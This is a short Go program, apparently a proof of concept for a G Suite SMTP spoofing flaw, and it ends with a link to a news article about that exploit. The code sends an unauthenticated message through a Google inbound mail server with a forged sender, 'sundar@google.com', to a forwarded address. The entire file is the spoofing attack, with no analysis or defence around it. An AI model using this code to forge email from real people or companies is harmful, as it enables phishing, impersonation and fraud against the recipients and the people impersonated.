package main

import (
	"fmt"
	"net/smtp"
)

func main() {

	var (
		auth smtp.Auth // nil
		addr = "alt1.gmr-smtp-in.l.google.com:25"
		// Any valid email address using Google Domain's Forwarding
		to = EmailType{
			Name:  "Shivam",
			Email: "help@shivamrathore.com",
		}
		// Any valid email address
		from = EmailType{
			Name:  "Sundar",
			Email: "sundar@google.com",
		}
	)

	msg := []byte(`From: ` + from.Name + ` <` + from.Email + `>
To: ` + to.Name + ` <` + to.Email + `>
Subject: Email sent - ` + from.Name + `

Hello 
This is a test mail sent through SMTP from ` + from.Name + ` <` + from.Email + `>
Regards`)

	err := smtp.SendMail(addr, auth, from.Email, []string{to.Email}, msg)
	fmt.Println(err)
}

type EmailType struct {
	Name, Email string
}
// https://portswigger.net/daily-swig/google-email-domains-spoofed-by-smtp-exploit-in-g-suite
